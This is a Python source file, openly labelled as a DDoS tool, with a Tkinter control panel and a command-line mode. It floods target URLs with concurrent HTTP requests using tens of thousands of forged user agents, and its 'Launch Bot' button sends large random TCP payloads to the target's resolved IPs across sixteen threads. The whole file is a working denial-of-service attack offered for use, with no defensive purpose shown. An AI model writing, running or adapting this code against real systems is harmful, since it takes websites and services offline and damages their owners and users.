# M o l l y
# DDoS 

import asyncio
import aiohttp
import socket
import ssl
import time
import json
import csv
import threading
from dataclasses import dataclass
from datetime import datetime
from collections import defaultdict, deque
from urllib.parse import urlparse
import tkinter as tk
from tkinter import ttk, filedialog, simpledialog
import random
import argparse
import ipaddress
import dns.resolver

MAX_POINTS = 18
BASE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/125.0.2535.51",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Apple Silicon Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.63.169 Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/6.6 Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) OPR/109.0.5097.80 Chrome/124.0.6367.91 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.91 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.91 Mobile Safari/537.36",
    "curl/8.6.0",
    "Wget/1.21.4 (linux-gnu)",
    "HTTPie/3.2.2",
    "python-requests/2.32.3",
    "python-httpx/0.27.0",
    "axios/1.7.0",
    "node-fetch/3.3.2",
    "okhttp/4.12.0",
    "Go-http-client/2.0",
    "Java/21 HttpClient",
    "PostmanRuntime/10.23.0",
    "Insomnia/2024.1.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +https://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +https://www.bing.com/bingbot.htm)",
    "DuckDuckBot/1.1; (+https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +https://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +https://www.baidu.com/search/spider.html)",
]

def generate_chrome_agents(count=20000):
    agents = []
    for _ in range(count):
        major = random.randint(110, 126)
        build = random.randint(6300, 65500)
        patch = random.randint(0, 20000)
        ua = (
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{major}.0.{build}.{patch} Safari/537.36"
        )
        agents.append(ua)
    return agents
USER_AGENTS = BASE_USER_AGENTS + generate_chrome_agents(50000)

def get_random_user_agent():
    return random.choice(USER_AGENTS)
@dataclass

class PingResult:
    url: str
    method: str
    status: int | None
    latency_ms: float | None
    bytes_total: int | None
    bytes_per_sec: float | None
    error: str | None
    timestamp: str

class SKDWAREEngine:
    def __init__(self, interval=0.01, timeout=1, max_retries=3, methods=None, headers=None):
        self.interval = interval
        self.timeout = timeout
        self.running = False
        self.paused = False
        self.max_retries = max_retries
        self.methods = methods if methods else ["GET"]
        self.methods = methods if methods else ["POST"]
        self.methods = methods if methods else ["OPTIONS"]
        self.methods = methods if methods else ["HEAD"]
        self.headers = headers if headers else {"User-Agent": random.choice(USER_AGENTS)}

    def headers_choice(self):
        return {"User-Agent": random.choice(USER_AGENTS)}
    
    async def _ping(self, session, url, method) -> PingResult:
        start = time.perf_counter()
        ts = datetime.utcnow().isoformat()
        attempt = 0
        while attempt <= self.max_retries:
            try:
                async with session.request(method, url, headers=self.headers_choice()) as r:
                    body = await r.read()
                    elapsed = time.perf_counter() - start
                    total_bytes = len(body) + sum(len(k) + len(v) for k, v in r.headers.items())
                    bps = total_bytes / elapsed if elapsed > 0 else 0
                    return PingResult(url, method, r.status, elapsed*1000, total_bytes, bps, None, ts)
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                attempt += 1
                if attempt > self.max_retries:
                    return PingResult(url, method, None, None, None, None, str(e), ts)
                await asyncio.sleep(0.01 * attempt)

    async def _tcp_ping(self, host, port=443, num_packets=1, packet_bytes=65500):
        ts = datetime.utcnow().isoformat()
        start = time.perf_counter()
        try:
            for _ in range(num_packets):
                reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=self.timeout)
                writer.write(random.randbytes(packet_bytes))
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            elapsed = (time.perf_counter()-start)*1000
            return PingResult(host, "TCP", 200, elapsed, num_packets*packet_bytes, (num_packets*packet_bytes)/(elapsed/1000), None, ts)
        except Exception as e:
            return PingResult(host, "TCP", None, None, None, None, str(e), ts)
        
    async def loop(self, urls, callback, bot_config=None):
        self.running = True
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(limit=1000, ssl=True)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            while self.running:
                if self.paused:
                    await asyncio.sleep(0.02)
                    continue
                tasks = []
                for url in urls:
                    if url.startswith("tcp://"):
                        host_port = url[6:].split(":")
                        host = host_port[0]
                        port = int(host_port[1]) if len(host_port) > 1 else 443
                        tasks.append(self._tcp_ping(host, port, **(bot_config or {})))
                    else:
                        for method in self.methods:
                            tasks.append(self._ping(session, url, method))
                for coro in asyncio.as_completed(tasks):
                    callback(await coro)
                await asyncio.sleep(self.interval)

    def stop(self): self.running=False

    def pause(self, value:bool): self.paused=value
def resolve_ips(domain):
    try:
        answers = dns.resolver.resolve(domain, 'A')
        return [str(rdata) for rdata in answers]
    except Exception:
        return []
    
class SKDWAREPanel(tk.Tk):
    MAX_POINTS = MAX_POINTS
    def __init__(self):
        super().__init__()
        self.title("[M o l l y x fsociety (DDoS)]")
        self.geometry("1400x850")
        self.engine = SKDWAREEngine(methods=["GET","POST","HEAD","OPTIONS"])
        self.results = []
        self.latency_history = defaultdict(lambda: deque(maxlen=self.MAX_POINTS))
        self.bandwidth_history = defaultdict(lambda: deque(maxlen=self.MAX_POINTS))
        self.stats = defaultdict(lambda: {"ok":0,"fail":0,"min":None,"max":None,"avg":0.0,"bytes":0})
        self.selected_host = tk.StringVar()
        self.bot_config = {"num_packets":100000,"packet_bytes":65536}
        self._build_ui()

    def _build_ui(self):

        banner = tk.Label(
            self,
            text=r"""

             .-')                                      ('-.   .-') _                      _ .-') _  _ .-') _                 .-')    
            ( OO ).                                  _(  OO) (  OO) )                    ( (  OO) )( (  OO) )               ( OO ).  
   ,------.(_)---\_) .-'),-----.    .-----.  ,-.-') (,------./     '._  ,--.   ,--.       \     .'_ \     .'_  .-'),-----. (_)---\_) 
('-| _.---'/    _ | ( OO'  .-.  '  '  .--./  |  |OO) |  .---'|'--...__)  \  `.'  /        ,`'--..._),`'--..._)( OO'  .-.  '/    _ |                                                                          ⠀
(OO|(_\    \  :` `. /   |  | |  |  |  |('-.  |  |  \ |  |    '--.  .--'.-')     /         |  |  \  '|  |  \  '/   |  | |  |\  :` `.           ⠀      ⠀⣤⠀⠀⠀                                                            
/  |  '--.  '..`''.)\_) |  |\|  | /_) |OO  ) |  |(_/(|  '--.    |  |  (OO  \   /          |  |   ' ||  |   ' |\_) |  |\|  | '..`''.)                ⢀⡞⠙⣆⠀                                                              
\_)|  .--' .-._)   \  \ |  | |  | ||  |`-'| ,|  |_.' |  .--'    |  |   |   /  /\_         |  |   / :|  |   / :  \ |  | |  |.-._)   \              ⢠⠏⢀⡀⠘⣇⠀                                                               
  \|  |_)  \       /   `'  '-'  '(_'  '--'\(_|  |    |  `---.   |  |   `-./  /.__)        |  '--'  /|  '--'  /   `'  '-'  '\       /             ⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀                                                                  
   `--'     `-----'      `-----'    `-----'  `--'    `------'   `--'     `--'             `-------' `-------'      `-----'  `-----'            ⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽                              
║                                                 F S O C I E T Y   ×   M O L L Y                                   v3.0           ║ ⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁       Skid Larps                                                        
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣    ⠳⡄⠘⢿⣠⠏⠀⠀⠀⠀⠀⠀⠀ ⠀⠘⣿⠀⠹⣇⠀⢀⡞       (`⣀⣀⣀ ᡣ𐭩⢀⣀⡀⣀') 
║ ╔══════════════════════════════════════╗  ╔════════════════════════════╗  ╔════════════════════════════╗                         ║      ⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀   ⡠⠔⡫⠟⠁⠀⢀⣤⢤⢤⠄⠀⠈⠉⠓⢦⣄⠀⢨⡇⠀
║ ║ Script Name : <fsociety x M o l l y> ║  ║ Author   : <MrMolly4>      ║  ║ Language : <Python 3.14+>  ║                         ║       ⣰⡿⠁⢿⣄⠀⠀⠀⠀   ⢠⣿⠃⠀⢻⣧ ⣦⣀⠤⡴⠋⣠⠞⠁⣀⢠⡔⣻⠃⡼⠀⢰⠀⠐⣄⠀⠀⢯⠳⣾⣇  
║ ║ Description : DDoS                   ║  ║ Created  : <1/20/26>       ║  ║ Updated  : <3/8/26>        ║                         ║     ⠴⠿⠿⠿⠿⠿⢿⣿⠿⠿⢿⣿⠿⠿⠿⠿⠿⠧⣠⠖⠋⠁⠀⠑⣄⣷⡞⠁⠀⣴⣷⠋⣼⣣⣾⡇⠰⣿⣧⠀⠈⠳⢳⡘⣿⠀⠀⠀⠀
║ ║ Logic : Packet Random Data (≤65500)  ║  ║ Status: Development Active ║  ║ Version  : <3.0>           ║                         ║            ⠳⠈⢿⣆⣠⡿   ⡰⠃⠀⠀⠀⠀⠀⡝⣿⠀⢀⣼⣿⠃⣼⣿⣿⠏⢧⡆⣿⡿⣷⡄⢠⡘⢦⠘⣷⢿⡄
║ ╚══════════════════════════════════════╝  ╚════════════════════════════╝  ╚════════════════════════════╝                         ║              ⠳ ⢻⡿⠁ ⡞ ⠀⠀⠀⠀ ⠀⣰⣿⠇⢠⣾⣿⠃⣼⣿⣿⠃⠀⢸⣧⣿⠁⠸⣿⣦⣿⣾⣧⣿⡜⣿
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣                ⠁  ⡞    ⠀⠀⠀⠀⣠⡿⠋⣰⣿⡿⠁⢰⣿⠟⠉⠀⠂⠘⣿⣿⠀⠀⠈⠻⣿⣿⣿⢸⣧⣿⠇
║ ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗ ║                  ⠳     ⢳⣴⠒⠋⣽⡉⣴⣿⣿⠁⣶⣿⣃⣠⣤⣭⡅⠀⠸⣿⠀⠀⢀⡀⠈⢻⣿⣾⣿⢿⠀⠀⠀⠀
║ ║ Methods : HTTP • HTTPS • TCP • DNS • GET • POST • OPTIONS • HEAD • User Agents                                               ║ ║                    ⠀ ⣠⡾⢷⣽⣿⣥⣾⣿⣿⡇⢠⣿⣿⡟⢹⣷⣿⡇⠀⠀⠹⡆⢀⣾⣿⣦⠄⢻⣿⣿⢾⡇
║ ║ Generator : User Agent Logic 1208 × 20000 → Creates up to 50k+ launch capacity                                               ║ ║                         ⢈⣿⣿⣿⣿⣿⠉⣿⣼⣿⡇⠉⠘⠿⠿⠁⠀⠀⠀⢣⠘⣿⡿⢿⠧⣾⣿⣿⣬⣧⠀
║ ║ Performance : Spam start/bot launch • ~700+ per 10 clicks • Functions operational                                            ║ ║                        ⢉⣿⣿⢿⣿⡏⢿⣯⠀⣿⣿⣿⡇⠀⠀⠀⠀⡀⡀⡀⡀⠀⠀⠀⠉⠀⣼⣿⣿⣿⣿⣿⣆
║ ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝ ║                        ⣾⠖⢉⣟⡇⣞⣿⡇⠀⠙⢦⣿⣿⣿⢀⣀⣀⣤⣴⣺⠵⢦ ⣿⣿⣿⣿⣿⡿⢟⠿⢿⣧
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣                      ⣾⠖⢉⣟⡇⣞⣿⡇⢦⣿⣿⣿⣿⣿⣿⡇⠀⢀⣀⣀⣤⣴⣺⠵⣿⣿⣿⣿⣿⣿⣿⡿⢟⠿⢿⣧⠤⠄
║ ╔══════════════════════════════════════╗  ╔══════════════════════════════════════════════════════════════════════════════════╗   ║                     ⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿
║ ║ Dependencies : aiohttp • dnspython   ║  ║ Environment : <Windows 11 OS> Contact : Discord <7s4l>                           ║   ║                     ⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿⣿⣿⣿⣿⢦⣿⣿
║ ║ Python : 3.14.2 Required + pip       ║  ║ Usage : Open with Python 3.14.2 in Visual Studio                                 ║   ║
║ ║ Arguments : CLI args via Int         ║  ║ Notes : <Be Careful> • Changelog : <Updates Soon...>                             ║   ║
║ ╚══════════════════════════════════════╝  ╚══════════════════════════════════════════════════════════════════════════════════╝   ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
                                       
""",
font=("Consolas", 7, "bold"),
justify="left"
        )
        banner.pack(anchor="w", padx=10, pady=(5,0))
        top = ttk.Frame(self); top.pack(fill="x", padx=15, pady=8)
        ttk.Label(top,text="Target Url:").pack(anchor="w")
        self.targets = tk.Text(top,height=3); self.targets.pack(fill="x")
        controls = ttk.Frame(self); controls.pack(fill="x", padx=13, pady=8)
        ttk.Button(controls,text="Start",command=self.start).pack(side="left", padx=3)
        ttk.Button(controls,text="Pause",command=lambda:self.engine.pause(True)).pack(side="left", padx=3)
        ttk.Button(controls,text="Resume",command=lambda:self.engine.pause(False)).pack(side="left", padx=3)
        ttk.Button(controls,text="Stop",command=self.engine.stop).pack(side="left", padx=3)
        ttk.Button(controls,text="Reset",command=self.reset).pack(side="left", padx=3)
        ttk.Button(controls,text="Set Bot Config",command=self.set_bot).pack(side="left", padx=5)
        ttk.Button(controls,text="Launch Bot",command=self.launch_bot).pack(side="left", padx=5)
        ttk.Button(controls,text="Export CSV",command=self.export_csv).pack(side="right", padx=3)
        ttk.Button(controls,text="Export JSON",command=self.export_json).pack(side="right", padx=3)
        mid = ttk.Frame(self); mid.pack(fill="both",expand=True,padx=10,pady=10)
        self.log = tk.Text(mid,width=100,bg="#FFFFFF",fg="#1850c2")
        self.log.pack(side="left",fill="both",expand=True)
        right = ttk.Frame(mid); right.pack(side="right",fill="y")
        ttk.Label(right,text="Live Host:").pack(anchor="w")
        self.host_select = ttk.Combobox(right,textvariable=self.selected_host)
        self.host_select.pack(fill="x")
        self.canvas_latency = tk.Canvas(right,width=400,height=150,bg="#ECECEC")
        self.canvas_latency.pack(pady=5)
        self.canvas_bandwidth = tk.Canvas(right,width=400,height=150,bg="#ECECEC")
        self.canvas_bandwidth.pack(pady=5)
        self.stats_label = ttk.Label(right,justify="left")
        self.stats_label.pack(anchor="w",pady=5)

    def set_bot(self):
        num = simpledialog.askinteger("Bot Config", "Packets per ping:", initialvalue=self.bot_config["num_packets"])
        size = simpledialog.askinteger("Bot Config", "Bytes per packet:", initialvalue=self.bot_config["packet_bytes"])
        if num and size:
            self.bot_config["num_packets"] = num
            self.bot_config["packet_bytes"] = size

    def launch_bot(self):
        urls = self.targets.get("1.0","end").strip().splitlines()
        targets = []
        for url in urls:
            domain = urlparse(url).netloc or url
            ips = resolve_ips(domain)
            targets.extend([f"tcp://{ip}:443" for ip in ips])
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(targets,self.thread_safe,self.bot_config)), daemon=True).start()

    def start(self):
        urls = self.targets.get("1.0","end").strip().splitlines()
        if not urls: return

        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()
        threading.Thread(target=lambda: asyncio.run(self.engine.loop(urls,self.thread_safe,self.bot_config)),daemon=True).start()

    def reset(self):
        self.results.clear(); self.latency_history.clear(); self.bandwidth_history.clear(); self.stats.clear()
        self.log.delete("1.0","end"); self.canvas_latency.delete("all"); self.canvas_bandwidth.delete("all")

    def thread_safe(self,r:PingResult): self.after(0,self.handle_result,r)

    def handle_result(self,r:PingResult):
        self.results.append(r)
        if r.url not in self.host_select["values"]:
            self.host_select["values"]=(*self.host_select["values"],r.url)
            if not self.selected_host.get(): self.selected_host.set(r.url)
        s = self.stats[r.url]
        if r.error:
            s["fail"]+=1
            line=f"[{r.timestamp}] {r.url} {r.method} ERROR {r.error}\n"
        else:
            s["ok"]+=1; s["bytes"]+=r.bytes_total or 0
            lat = r.latency_ms or 0
            s["min"]=lat if s["min"] is None else min(s["min"],lat)
            s["max"]=lat if s["max"] is None else max(s["max"],lat)
            s["avg"]=((s["avg"]*(s["ok"]-1))+lat)/s["ok"]
            self.latency_history[r.url].append(lat)
            self.bandwidth_history[r.url].append(r.bytes_per_sec or 0)
            line=f"[{r.timestamp}] {r.url} {r.method} {r.status} {lat:.2f}ms | {r.bytes_total or 0} bytes\n"
        self.log.insert("end",line); self.log.see("end"); self.draw_graphs(); self.update_stats()

    def draw_graph(self,canvas,data):
        canvas.delete("all")
        if len(data)<2: return
        w,h=400,150; mx,mn=max(data),min(data); rng=max(1,mx-mn)
        pts=[(i*(w/(len(data)-1)),h-((v-mn)/rng)*h) for i,v in enumerate(data)]
        for i in range(len(pts)-1): canvas.create_line(*pts[i],*pts[i+1],fill="#1850c2",width=2)

    def draw_graphs(self):
        host=self.selected_host.get()
        if host:
            self.draw_graph(self.canvas_latency,self.latency_history[host])
            self.draw_graph(self.canvas_bandwidth,self.bandwidth_history[host])

    def update_stats(self):
        host=self.selected_host.get()
        if host:
            s=self.stats[host]
            self.stats_label.config(text=f"Host:{host}\nOK:{s['ok']} FAIL:{s['fail']}\nMIN:{s['min']:.2f}ms MAX:{s['max']:.2f}ms AVG:{s['avg']:.2f}ms TOTAL BYTES:{s['bytes']}")

    def export_csv(self):
        if not self.results: return
        path=filedialog.asksaveasfilename(defaultextension=".csv")
        if not path: return
        with open(path,"w",newline="",encoding="utf-8") as f:
            w=csv.writer(f); w.writerow(["timestamp","url","method","status","latency_ms","bytes","bytes_per_sec","error"])
            for r in self.results: w.writerow([r.timestamp,r.url,r.method,r.status,r.latency_ms,r.bytes_total,r.bytes_per_sec,r.error])

    def export_json(self):
        if not self.results: return
        path=filedialog.asksaveasfilename(defaultextension=".json")
        if not path: return
        with open(path,"w",encoding="utf-8") as f:
            json.dump([r.__dict__ for r in self.results],f,indent=2)

async def cli_mode(urls, interval, methods=None):
    engine = SKDWAREEngine(interval=interval, methods=methods)
    async def cb(r): print(f"{r.timestamp} {r.url} {r.method} {r.status or '-'} {r.latency_ms or 0:.2f}ms {r.bytes_total or 0} bytes")

    await engine.loop(urls, lambda r: asyncio.create_task(cb(r)))
if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--cli",action="store_true")
    parser.add_argument("--interval",type=float,default=0.05)
    parser.add_argument("--method",nargs="*",default=["GET"])
    parser.add_argument("urls",nargs="*")
    args = parser.parse_args()
    if args.cli and args.urls:
        asyncio.run(cli_mode(args.urls,args.interval,args.method))
    else:
        app = SKDWAREPanel()
        app.mainloop()
